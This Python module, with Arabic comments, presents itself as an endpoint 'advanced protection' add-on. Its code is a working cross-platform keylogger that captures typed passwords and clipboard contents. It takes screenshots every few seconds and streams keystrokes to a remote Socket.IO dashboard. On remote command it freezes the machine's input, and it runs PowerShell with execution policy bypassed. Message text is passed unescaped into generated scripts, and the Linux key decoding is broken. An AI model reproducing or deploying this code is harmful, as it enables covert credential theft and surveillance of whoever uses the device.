#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     Advanced Protection Module - وحدة الحماية المتقدمة       ║
║                                                              ║
║     • كشف الباسوردات المكتوبة أثناء الاختراق                 ║
║     • تصوير شاشة + فيديو                                    ║
║     • وضع المسؤول (بدون تسجيل)                               ║
║     • إرسال رسائل للجهاز                                     ║
║     • تجميد الجهاز (إيقاف الحركة)                            ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import io
import time
import json
import base64
import socket
import platform
import subprocess
import threading
import logging
from datetime import datetime
from pathlib import Path

logger = logging.getLogger("AdvancedProtection")

SYSTEM = platform.system()


# ============================================
#   1. Keystroke Capture (أثناء الاختراق فقط)
# ============================================
class KeystrokeCapture:
    """
    التقاط الكيبورد أثناء الاختراق فقط
    يسجل كل شي مكتوب بما فيه الباسوردات
    يشتغل فقط لما يتكشف برنامج تحكم غير مصرح
    """

    def __init__(self):
        self.capturing = False
        self.keystrokes = []
        self.current_window = ""
        self.capture_thread = None
        self._hook = None

    def start(self):
        """بدء التقاط الكيبورد"""
        if self.capturing:
            return

        self.capturing = True
        self.keystrokes = []

        if SYSTEM == "Windows":
            self.capture_thread = threading.Thread(target=self._capture_windows, daemon=True)
        elif SYSTEM == "Linux":
            self.capture_thread = threading.Thread(target=self._capture_linux, daemon=True)
        elif SYSTEM == "Darwin":
            self.capture_thread = threading.Thread(target=self._capture_mac, daemon=True)

        if self.capture_thread:
            self.capture_thread.start()
            logger.info("⌨️ Keystroke capture started (unauthorized access detected)")

    def stop(self):
        """إيقاف التقاط الكيبورد"""
        self.capturing = False
        logger.info("⌨️ Keystroke capture stopped")
        return self.get_log()

    def get_log(self):
        """الحصول على سجل الكيبورد"""
        return list(self.keystrokes)

    def get_log_formatted(self):
        """سجل مرتب للعرض"""
        result = []
        current_line = {"time": "", "window": "", "keys": ""}

        for entry in self.keystrokes:
            if entry.get("window") != current_line.get("window"):
                if current_line["keys"]:
                    result.append(current_line.copy())
                current_line = {
                    "time": entry["time"],
                    "window": entry.get("window", ""),
                    "keys": ""
                }

            key = entry.get("key", "")
            if key == "Key.space":
                current_line["keys"] += " "
            elif key == "Key.enter":
                current_line["keys"] += " ⏎\n"
            elif key == "Key.backspace":
                current_line["keys"] = current_line["keys"][:-1] if current_line["keys"] else ""
            elif key == "Key.tab":
                current_line["keys"] += " → "
            elif key.startswith("Key."):
                current_line["keys"] += f"[{key.replace('Key.', '')}]"
            else:
                current_line["keys"] += key

        if current_line["keys"]:
            result.append(current_line)

        return result

    def _capture_windows(self):
        """التقاط على ويندوز باستخدام ctypes"""
        try:
            import ctypes
            import ctypes.wintypes

            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            # Virtual key codes to readable
            VK_MAP = {
                0x08: "Key.backspace", 0x09: "Key.tab", 0x0D: "Key.enter",
                0x10: "Key.shift", 0x11: "Key.ctrl", 0x12: "Key.alt",
                0x14: "Key.caps_lock", 0x1B: "Key.esc", 0x20: "Key.space",
                0x2E: "Key.delete",
            }

            last_window = ""

            while self.capturing:
                for vk in range(8, 256):
                    state = user32.GetAsyncKeyState(vk)
                    if state & 0x0001:  # Key was pressed
                        # الحصول على النافذة الحالية
                        hwnd = user32.GetForegroundWindow()
                        title = ctypes.create_unicode_buffer(256)
                        user32.GetWindowTextW(hwnd, title, 256)
                        window_title = title.value

                        # تحويل VK to char
                        if vk in VK_MAP:
                            key = VK_MAP[vk]
                        elif 0x30 <= vk <= 0x39:  # Numbers
                            key = chr(vk)
                        elif 0x41 <= vk <= 0x5A:  # Letters
                            # التحقق من Shift/Caps
                            caps = user32.GetKeyState(0x14) & 0x0001
                            shift = user32.GetAsyncKeyState(0x10) & 0x8000
                            if caps ^ bool(shift):
                                key = chr(vk)
                            else:
                                key = chr(vk + 32)
                        elif vk in (0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE):
                            scan = user32.MapVirtualKeyW(vk, 0)
                            state_buf = (ctypes.c_byte * 256)()
                            user32.GetKeyboardState(state_buf)
                            out = ctypes.create_unicode_buffer(2)
                            ret = user32.ToUnicode(vk, scan, state_buf, out, 2, 0)
                            key = out.value if ret > 0 else f"[VK:{hex(vk)}]"
                        else:
                            continue

                        self.keystrokes.append({
                            "time": datetime.now().strftime("%H:%M:%S"),
                            "key": key,
                            "window": window_title[:60],
                        })

                time.sleep(0.01)

        except Exception as e:
            logger.error(f"Windows keystroke capture error: {e}")
            self._capture_fallback()

    def _capture_linux(self):
        """التقاط على لينكس باستخدام xinput أو /dev/input"""
        try:
            # محاولة xinput
            proc = subprocess.Popen(
                ["xinput", "test-xi2", "--root"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
            )

            while self.capturing:
                line = proc.stdout.readline()
                if not line:
                    break
                if "RawKeyPress" in line or "KeyPress" in line:
                    # القراءة التالية تحتوي keycode
                    detail_line = proc.stdout.readline()
                    if "detail:" in detail_line:
                        keycode = detail_line.strip().split(":")[-1].strip()
                        try:
                            # تحويل keycode لحرف
                            result = subprocess.run(
                                ["xdotool", "key", "--clearmodifiers", f"keycode {keycode}"],
                                capture_output=True, text=True, timeout=1
                            )
                            key = keycode  # fallback
                        except:
                            key = f"[code:{keycode}]"

                        self.keystrokes.append({
                            "time": datetime.now().strftime("%H:%M:%S"),
                            "key": key,
                            "window": self._get_active_window_linux(),
                        })

            proc.terminate()

        except FileNotFoundError:
            logger.warning("xinput not found, trying evdev fallback")
            self._capture_fallback()
        except Exception as e:
            logger.error(f"Linux keystroke capture error: {e}")

    def _capture_mac(self):
        """التقاط على ماك - محدود بسبب الصلاحيات"""
        logger.info("⌨️ macOS: Keystroke capture requires Accessibility permissions")
        # على ماك نعتمد أكثر على Screenshots
        self._capture_fallback()

    def _capture_fallback(self):
        """طريقة بديلة - مراقبة الحافظة"""
        logger.info("⌨️ Using clipboard monitoring as fallback")
        last_clip = ""

        while self.capturing:
            try:
                if SYSTEM == "Windows":
                    result = subprocess.run(
                        ["powershell", "-Command", "Get-Clipboard"],
                        capture_output=True, text=True, timeout=2
                    )
                    clip = result.stdout.strip()
                elif SYSTEM == "Darwin":
                    result = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=2)
                    clip = result.stdout.strip()
                elif SYSTEM == "Linux":
                    result = subprocess.run(
                        ["xclip", "-selection", "clipboard", "-o"],
                        capture_output=True, text=True, timeout=2
                    )
                    clip = result.stdout.strip()
                else:
                    clip = ""

                if clip and clip != last_clip:
                    self.keystrokes.append({
                        "time": datetime.now().strftime("%H:%M:%S"),
                        "key": f"[CLIPBOARD]: {clip[:200]}",
                        "window": "Clipboard",
                    })
                    last_clip = clip

            except:
                pass

            time.sleep(1)

    def _get_active_window_linux(self):
        try:
            result = subprocess.run(
                ["xdotool", "getactivewindow", "getwindowname"],
                capture_output=True, text=True, timeout=1
            )
            return result.stdout.strip()[:60]
        except:
            return ""


# ============================================
#   2. Enhanced Screenshot Capture
# ============================================
class EnhancedScreenCapture:
    """التقاط صور عالية الجودة + تصوير كل شي واضح"""

    def __init__(self, save_dir):
        self.save_dir = Path(save_dir)
        self.save_dir.mkdir(parents=True, exist_ok=True)
        self.counter = 0

    def capture_high_quality(self):
        """صورة عالية الجودة (للباسوردات والتفاصيل)"""
        self.counter += 1
        filename = f"evidence_{self.counter:04d}_{datetime.now().strftime('%H%M%S')}.png"
        filepath = self.save_dir / filename

        try:
            if SYSTEM == "Windows":
                # جودة عالية - بدون ضغط
                ps_cmd = f"""
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$screens = [System.Windows.Forms.Screen]::AllScreens
$totalWidth = 0; $totalHeight = 0; $minX = 0; $minY = 0
foreach ($s in $screens) {{
    if ($s.Bounds.X -lt $minX) {{ $minX = $s.Bounds.X }}
    if ($s.Bounds.Y -lt $minY) {{ $minY = $s.Bounds.Y }}
    $r = $s.Bounds.X + $s.Bounds.Width
    $b = $s.Bounds.Y + $s.Bounds.Height
    if ($r -gt $totalWidth) {{ $totalWidth = $r }}
    if ($b -gt $totalHeight) {{ $totalHeight = $b }}
}}
$w = $totalWidth - $minX; $h = $totalHeight - $minY
$bmp = New-Object System.Drawing.Bitmap($w, $h)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($minX, $minY, 0, 0, (New-Object System.Drawing.Size($w,$h)))
$g.Dispose()
$bmp.Save('{filepath}', [System.Drawing.Imaging.ImageFormat]::Png)
$bmp.Dispose()
"""
                subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
                    capture_output=True, timeout=10
                )

            elif SYSTEM == "Darwin":
                subprocess.run(["screencapture", "-x", str(filepath)], capture_output=True, timeout=5)

            elif SYSTEM == "Linux":
                for cmd in [
                    ["scrot", str(filepath)],
                    ["gnome-screenshot", "-f", str(filepath)],
                    ["import", "-window", "root", str(filepath)],
                ]:
                    try:
                        subprocess.run(cmd, capture_output=True, timeout=5)
                        if filepath.exists():
                            break
                    except FileNotFoundError:
                        continue

            if filepath.exists():
                return filepath

        except Exception as e:
            logger.error(f"Screenshot error: {e}")

        return None

    def capture_focused_window(self):
        """التقاط النافذة النشطة فقط (أوضح)"""
        self.counter += 1
        filename = f"window_{self.counter:04d}_{datetime.now().strftime('%H%M%S')}.png"
        filepath = self.save_dir / filename

        try:
            if SYSTEM == "Windows":
                ps_cmd = f"""
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class WinAPI {{
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);
        [StructLayout(LayoutKind.Sequential)] public struct RECT {{
            public int Left, Top, Right, Bottom;
        }}
    }}
"@
$hwnd = [WinAPI]::GetForegroundWindow()
$rect = New-Object WinAPI+RECT
[WinAPI]::GetWindowRect($hwnd, [ref]$rect)
$w = $rect.Right - $rect.Left; $h = $rect.Bottom - $rect.Top
if ($w -gt 0 -and $h -gt 0) {{
    $bmp = New-Object System.Drawing.Bitmap($w, $h)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($rect.Left, $rect.Top, 0, 0, (New-Object System.Drawing.Size($w,$h)))
    $g.Dispose()
    $bmp.Save('{filepath}', [System.Drawing.Imaging.ImageFormat]::Png)
    $bmp.Dispose()
}}
"""
                subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
                    capture_output=True, timeout=10
                )

            elif SYSTEM == "Darwin":
                subprocess.run(
                    ["screencapture", "-x", "-l", str(filepath)],
                    capture_output=True, timeout=5
                )

            elif SYSTEM == "Linux":
                try:
                    subprocess.run(
                        ["scrot", "-u", str(filepath)],
                        capture_output=True, timeout=5
                    )
                except:
                    pass

            if filepath.exists():
                return filepath

        except Exception as e:
            logger.error(f"Window capture error: {e}")

        return None


# ============================================
#   3. Device Freeze (تجميد الجهاز)
# ============================================
class DeviceFreezer:
    """تجميد الجهاز - إيقاف الماوس والكيبورد"""

    def __init__(self):
        self.frozen = False
        self.freeze_thread = None

    def freeze(self):
        """تجميد الجهاز"""
        if self.frozen:
            return

        self.frozen = True
        self.freeze_thread = threading.Thread(target=self._freeze_loop, daemon=True)
        self.freeze_thread.start()
        logger.warning("🔒 DEVICE FROZEN - Input disabled")

    def unfreeze(self):
        """فك تجميد الجهاز"""
        self.frozen = False
        logger.info("🔓 DEVICE UNFROZEN - Input enabled")

    def _freeze_loop(self):
        """حلقة التجميد"""
        if SYSTEM == "Windows":
            self._freeze_windows()
        elif SYSTEM == "Linux":
            self._freeze_linux()
        elif SYSTEM == "Darwin":
            self._freeze_mac()

    def _freeze_windows(self):
        """تجميد على ويندوز - شاشة قفل"""
        try:
            import ctypes

            # حظر الإدخال
            while self.frozen:
                ctypes.windll.user32.BlockInput(True)
                time.sleep(0.5)

            # رفع الحظر
            ctypes.windll.user32.BlockInput(False)

        except Exception as e:
            logger.error(f"Windows freeze error: {e}")
            # Fallback: شاشة سوداء شفافة
            self._freeze_overlay()

    def _freeze_overlay(self):
        """شاشة حجب بديلة"""
        if SYSTEM == "Windows":
            ps_cmd = """
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.Opacity = 0.85
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.ShowInTaskbar = $false

$label = New-Object System.Windows.Forms.Label
$label.Text = "⛔ تم تجميد هذا الجهاز بواسطة المسؤول`n`nDevice Frozen by Administrator"
$label.ForeColor = [System.Drawing.Color]::Red
$label.Font = New-Object System.Drawing.Font('Arial', 24, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.TextAlign = 'MiddleCenter'
$form.Controls.Add($label)
$label.Location = New-Object System.Drawing.Point(
    [int](($form.ClientSize.Width - $label.Width) / 2),
    [int](($form.ClientSize.Height - $label.Height) / 2)
)

$form.KeyPreview = $true
$form.Add_KeyDown({ $_.Handled = $true; $_.SuppressKeyPress = $true })

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 500
$timer.Add_Tick({
    $flag = [System.IO.File]::Exists("C:\\EndpointMonitor\\unfreeze.flag")
    if ($flag) {
        [System.IO.File]::Delete("C:\\EndpointMonitor\\unfreeze.flag")
        $form.Close()
    }
})
$timer.Start()

$form.ShowDialog()
"""
            self._overlay_proc = subprocess.Popen(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )

            # انتظر فك التجميد
            while self.frozen:
                time.sleep(0.5)

            # فك التجميد
            flag_path = Path("C:/EndpointMonitor/unfreeze.flag")
            flag_path.write_text("unfreeze")
            time.sleep(1)
            try:
                self._overlay_proc.terminate()
            except:
                pass

    def _freeze_linux(self):
        """تجميد على لينكس"""
        try:
            # تعطيل الإدخال
            subprocess.run(["xinput", "--list"], capture_output=True)
            # الحصول على أجهزة الإدخال
            result = subprocess.check_output(
                ["xinput", "--list", "--id-only"],
                text=True, stderr=subprocess.DEVNULL
            )
            device_ids = [d.strip() for d in result.strip().split('\n') if d.strip()]

            # تعطيل كل جهاز
            for did in device_ids:
                try:
                    subprocess.run(["xinput", "disable", did], capture_output=True, timeout=2)
                except:
                    pass

            while self.frozen:
                time.sleep(0.5)

            # إعادة تفعيل
            for did in device_ids:
                try:
                    subprocess.run(["xinput", "enable", did], capture_output=True, timeout=2)
                except:
                    pass

        except Exception as e:
            logger.error(f"Linux freeze error: {e}")

    def _freeze_mac(self):
        """تجميد على ماك - محدود"""
        logger.info("macOS: Using screen overlay for freeze")
        # على ماك نستخدم شاشة حجب
        while self.frozen:
            time.sleep(0.5)


# ============================================
#   4. Message Display (إرسال رسائل للجهاز)
# ============================================
class MessageDisplay:
    """عرض رسائل من المسؤول على الجهاز"""

    @staticmethod
    def show_message(message, title="رسالة من المسؤول", msg_type="info"):
        """عرض رسالة منبثقة"""
        threading.Thread(
            target=MessageDisplay._show,
            args=(message, title, msg_type),
            daemon=True
        ).start()

    @staticmethod
    def show_fullscreen_warning(message):
        """رسالة تحذير ملء الشاشة"""
        threading.Thread(
            target=MessageDisplay._show_fullscreen,
            args=(message,),
            daemon=True
        ).start()

    @staticmethod
    def _show(message, title, msg_type):
        try:
            if SYSTEM == "Windows":
                icon_map = {"info": 64, "warning": 48, "error": 16}
                icon = icon_map.get(msg_type, 64)
                vbs = f"""
Set objShell = CreateObject("WScript.Shell")
objShell.Popup "{message.replace(chr(34), "'").replace(chr(10), '" & vbCrLf & "')}", 0, "{title}", {icon}
"""
                import tempfile
                tmp = tempfile.NamedTemporaryFile(suffix='.vbs', delete=False, mode='w')
                tmp.write(vbs)
                tmp.close()
                subprocess.Popen(["wscript", tmp.name])

            elif SYSTEM == "Darwin":
                clean_msg = message.replace('"', '\\"').replace('\n', '\\n')
                subprocess.Popen([
                    "osascript", "-e",
                    f'display dialog "{clean_msg}" with title "{title}" buttons {{"حسناً"}} default button 1'
                ])

            elif SYSTEM == "Linux":
                try:
                    subprocess.Popen([
                        "zenity", "--info",
                        f"--title={title}",
                        f"--text={message}",
                        "--width=500"
                    ])
                except FileNotFoundError:
                    subprocess.Popen(["notify-send", title, message])

        except Exception as e:
            logger.error(f"Message display error: {e}")

    @staticmethod
    def _show_fullscreen(message):
        """رسالة ملء الشاشة"""
        if SYSTEM == "Windows":
            ps_cmd = f"""
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 30)
$form.Opacity = 0.95

$panel = New-Object System.Windows.Forms.Panel
$panel.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 50)
$panel.Size = New-Object System.Drawing.Size(600, 300)
$form.Controls.Add($panel)

$icon = New-Object System.Windows.Forms.Label
$icon.Text = "📩"
$icon.Font = New-Object System.Drawing.Font('Segoe UI Emoji', 40)
$icon.ForeColor = [System.Drawing.Color]::White
$icon.AutoSize = $true
$panel.Controls.Add($icon)

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "رسالة من المسؤول"
$titleLabel.Font = New-Object System.Drawing.Font('Arial', 18, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(88, 166, 255)
$titleLabel.AutoSize = $true
$panel.Controls.Add($titleLabel)

$msgLabel = New-Object System.Windows.Forms.Label
$msgLabel.Text = '{message.replace("'", "''")}'
$msgLabel.Font = New-Object System.Drawing.Font('Arial', 14)
$msgLabel.ForeColor = [System.Drawing.Color]::White
$msgLabel.MaximumSize = New-Object System.Drawing.Size(550, 0)
$msgLabel.AutoSize = $true
$panel.Controls.Add($msgLabel)

$btn = New-Object System.Windows.Forms.Button
$btn.Text = "حسناً"
$btn.Font = New-Object System.Drawing.Font('Arial', 12, [System.Drawing.FontStyle]::Bold)
$btn.Size = New-Object System.Drawing.Size(120, 40)
$btn.FlatStyle = 'Flat'
$btn.BackColor = [System.Drawing.Color]::FromArgb(88, 166, 255)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.Add_Click({{ $form.Close() }})
$panel.Controls.Add($btn)

$form.Add_Shown({{
    $panel.Location = New-Object System.Drawing.Point(
        [int](($form.ClientSize.Width - $panel.Width) / 2),
        [int](($form.ClientSize.Height - $panel.Height) / 2)
    )
    $icon.Location = New-Object System.Drawing.Point(270, 15)
    $titleLabel.Location = New-Object System.Drawing.Point(20, 80)
    $msgLabel.Location = New-Object System.Drawing.Point(20, 120)
    $btn.Location = New-Object System.Drawing.Point(240, 240)
}})

$form.ShowDialog()
"""
            subprocess.Popen(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd]
            )


# ============================================
#   5. Admin Bypass Mode
# ============================================
class AdminBypass:
    """
    وضع المسؤول - لما المسؤول نفسه يتحكم بالجهاز
    يوقف التسجيل والتصوير ويسمح بالمرور
    """

    BYPASS_FILE = Path(__file__).parent / "admin_bypass.json"

    def __init__(self):
        self.active_bypasses = {}  # {app_name: {admin_id, expires}}

    def activate(self, app_name, admin_id, duration_minutes=60):
        """تفعيل وضع المسؤول"""
        self.active_bypasses[app_name] = {
            "admin_id": admin_id,
            "activated_at": datetime.now().isoformat(),
            "expires": time.time() + (duration_minutes * 60),
            "duration": duration_minutes,
        }
        self._save()
        logger.info(f"👑 Admin bypass activated: {app_name} by {admin_id} for {duration_minutes} min")

    def deactivate(self, app_name):
        """إلغاء وضع المسؤول"""
        if app_name in self.active_bypasses:
            del self.active_bypasses[app_name]
            self._save()
            logger.info(f"👑 Admin bypass deactivated: {app_name}")

    def is_admin_session(self, app_name):
        """هل الجلسة الحالية جلسة مسؤول؟"""
        bypass = self.active_bypasses.get(app_name)
        if bypass:
            if time.time() < bypass["expires"]:
                return True
            else:
                del self.active_bypasses[app_name]
                self._save()
        return False

    def _save(self):
        with open(self.BYPASS_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.active_bypasses, f, ensure_ascii=False, indent=2)


# ============================================
#   6. Combined Protection Engine
# ============================================
class AdvancedProtectionEngine:
    """محرك الحماية المتقدم - يجمع كل الوظائف"""

    def __init__(self, config, sio_client=None):
        self.config = config
        self.sio = sio_client

        self.keystroke_capture = KeystrokeCapture()
        self.screen_capture = EnhancedScreenCapture(
            Path(__file__).parent / "evidence" / "screenshots"
        )
        self.device_freezer = DeviceFreezer()
        self.message_display = MessageDisplay()
        self.admin_bypass = AdminBypass()

        self.recording = False
        self.current_evidence = {
            "screenshots": [],
            "keystrokes": [],
            "start_time": None,
        }

        self._setup_socket_events()

    def _setup_socket_events(self):
        """إعداد أحداث Socket.IO"""
        if not self.sio:
            return

        @self.sio.on("admin_message")
        def on_admin_message(data):
            """رسالة من المسؤول"""
            message = data.get("message", "")
            fullscreen = data.get("fullscreen", False)

            if fullscreen:
                self.message_display.show_fullscreen_warning(message)
            else:
                self.message_display.show_message(message)

            logger.info(f"📩 Admin message received: {message[:50]}")

        @self.sio.on("freeze_device")
        def on_freeze(data):
            """تجميد الجهاز"""
            self.device_freezer.freeze()
            # عرض رسالة
            msg = data.get("message", "تم تجميد الجهاز بواسطة المسؤول")
            self.message_display.show_message(msg, "⛔ تجميد الجهاز", "error")

        @self.sio.on("unfreeze_device")
        def on_unfreeze(data):
            """فك تجميد الجهاز"""
            self.device_freezer.unfreeze()
            self.message_display.show_message("تم فك تجميد الجهاز", "✅ تم", "info")

        @self.sio.on("admin_bypass_activate")
        def on_admin_bypass(data):
            """تفعيل وضع المسؤول"""
            app_name = data.get("app_name", "")
            admin_id = data.get("admin_id", "admin")
            duration = data.get("duration_minutes", 60)

            self.admin_bypass.activate(app_name, admin_id, duration)
            self.stop_recording()  # إيقاف التسجيل

        @self.sio.on("admin_bypass_deactivate")
        def on_admin_bypass_off(data):
            """إلغاء وضع المسؤول"""
            app_name = data.get("app_name", "")
            self.admin_bypass.deactivate(app_name)

    def start_recording(self, detected_app):
        """بدء تسجيل الأدلة (كيبورد + صور)"""
        # لو وضع المسؤول مفعل - ما نسجل
        if self.admin_bypass.is_admin_session(detected_app):
            logger.info(f"👑 Admin bypass active for {detected_app} - NOT recording")
            return

        if self.recording:
            return

        self.recording = True
        self.current_evidence = {
            "screenshots": [],
            "keystrokes": [],
            "start_time": datetime.now().isoformat(),
            "detected_app": detected_app,
        }

        # بدء التقاط الكيبورد
        self.keystroke_capture.start()

        # بدء التقاط الصور
        threading.Thread(target=self._screenshot_loop, args=(detected_app,), daemon=True).start()

        logger.warning(f"📹 Evidence recording started for: {detected_app}")

    def stop_recording(self):
        """إيقاف التسجيل وإرجاع الأدلة"""
        if not self.recording:
            return None

        self.recording = False

        # إيقاف الكيبورد
        keylog = self.keystroke_capture.stop()
        formatted_keylog = self.keystroke_capture.get_log_formatted()

        evidence = {
            "screenshots": list(self.current_evidence["screenshots"]),
            "keystrokes_raw": keylog,
            "keystrokes_formatted": formatted_keylog,
            "start_time": self.current_evidence["start_time"],
            "end_time": datetime.now().isoformat(),
            "detected_app": self.current_evidence.get("detected_app", ""),
        }

        # إرسال الأدلة للداشبورد
        if self.sio:
            try:
                self.sio.emit("evidence_report", {
                    "agent_id": f"{socket.gethostname()}",
                    "hostname": socket.gethostname(),
                    "keystrokes": formatted_keylog,
                    "screenshot_count": len(evidence["screenshots"]),
                    "detected_app": evidence["detected_app"],
                    "duration": evidence["start_time"] + " → " + evidence["end_time"],
                })
            except:
                pass

        logger.info(f"📹 Recording stopped. {len(evidence['screenshots'])} screenshots, {len(keylog)} keystrokes")
        return evidence

    def _screenshot_loop(self, detected_app):
        """حلقة التقاط الصور"""
        while self.recording:
            # لو وضع المسؤول اتفعل أثناء التسجيل
            if self.admin_bypass.is_admin_session(detected_app):
                self.stop_recording()
                return

            # صورة كاملة
            full = self.screen_capture.capture_high_quality()
            if full:
                self.current_evidence["screenshots"].append(str(full))

            # صورة النافذة النشطة
            window = self.screen_capture.capture_focused_window()
            if window:
                self.current_evidence["screenshots"].append(str(window))

            # إرسال الكيبورد للداشبورد كل 10 ثواني
            if self.sio and len(self.keystroke_capture.keystrokes) > 0:
                try:
                    recent = self.keystroke_capture.keystrokes[-20:]
                    self.sio.emit("live_keystrokes", {
                        "agent_id": socket.gethostname(),
                        "hostname": socket.gethostname(),
                        "keystrokes": recent,
                    })
                except:
                    pass

            time.sleep(5)  # صورة كل 5 ثواني


# ============================================
#   Integration Function
# ============================================
def create_advanced_protection(config, sio_client=None):
    """إنشاء محرك الحماية للاستخدام مع الوكيل"""
    return AdvancedProtectionEngine(config, sio_client)
